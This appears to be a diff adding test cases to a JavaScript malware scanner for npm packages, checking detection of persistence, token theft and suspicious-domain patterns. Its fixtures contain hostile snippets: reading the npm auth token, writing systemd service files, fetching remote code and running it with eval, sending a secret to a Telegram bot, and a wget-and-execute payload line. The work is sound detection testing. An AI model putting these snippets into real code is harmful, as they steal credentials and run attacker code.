@@ -2611,6 +2611,125 @@ exec('wget https://evil.example.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp
       assert(scriptsThreats.length > 0, 'Should detect threats in scripts/ directory (not skipped as dev file)');
     } finally { cleanupTemp(tmp); }
   });
+
+  // ===== v2.10.11: TeamPCP/CanisterWorm detections =====
+  console.log('\n=== TEAMPCP/CANISTERWORM DETECTIONS (v2.10.11) ===\n');
+
+  await asyncTest('AST: writeFileSync to systemd path → systemd_persistence CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+fs.writeFileSync('/home/user/.config/systemd/user/pgmon.service', '[Unit]\\nDescription=PG Monitor');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'systemd_persistence');
+      assert(t, 'Should detect systemd_persistence for writeFileSync to systemd/ path');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: writeFileSync to .service file → systemd_persistence CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+fs.writeFileSync('/tmp/internal-monitor.service', '[Service]\\nExecStart=/usr/bin/python3 runner.py');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'systemd_persistence');
+      assert(t, 'Should detect systemd_persistence for writeFileSync to .service file');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: writeFileSync to config.json → NO systemd_persistence', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+fs.writeFileSync('./config.json', '{"port": 3000}');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'systemd_persistence');
+      assert(!t, 'writeFileSync to config.json should NOT trigger systemd_persistence');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: exec("npm config get authToken") → npm_token_steal CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const { execSync } = require('child_process');
+const token = execSync('npm config get //registry.npmjs.org/:_authToken').toString().trim();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'npm_token_steal');
+      assert(t, 'Should detect npm_token_steal for npm config get authToken');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: exec("npm whoami") → npm_token_steal CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const { execSync } = require('child_process');
+const user = execSync('npm whoami').toString().trim();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'npm_token_steal');
+      assert(t, 'Should detect npm_token_steal for npm whoami');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: exec("npm install") → NO npm_token_steal', async () => {
+    const tmp = makeTempPkg(`
+const { execSync } = require('child_process');
+execSync('npm install lodash');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'npm_token_steal');
+      assert(!t, 'npm install should NOT trigger npm_token_steal');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: fetch to icp0.io → suspicious_domain HIGH', async () => {
+    const tmp = makeTempPkg(`
+const https = require('https');
+https.get('https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/', (res) => {
+  let data = '';
+  res.on('data', c => data += c);
+  res.on('end', () => eval(data));
+});
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_domain' && t.message && t.message.includes('icp0.io'));
+      assert(t, 'fetch to icp0.io should be detected as suspicious_domain');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: fetch to api.telegram.org → suspicious_domain HIGH', async () => {
+    const tmp = makeTempPkg(`
+fetch('https://api.telegram.org/bot1234:ABCD/sendMessage', {
+  method: 'POST',
+  body: JSON.stringify({ chat_id: '-123', text: secretKey })
+});
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_domain' && t.message && t.message.includes('telegram'));
+      assert(t, 'fetch to api.telegram.org should be detected as suspicious_domain');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: fetch to trycloudflare.com → suspicious_domain MEDIUM', async () => {
+    const tmp = makeTempPkg(`
+const https = require('https');
+https.get('https://souls-entire-defined-routes.trycloudflare.com/kube.py');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_domain' && t.message && t.message.includes('trycloudflare'));
+      assert(t, 'fetch to trycloudflare.com should be detected as suspicious_domain');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
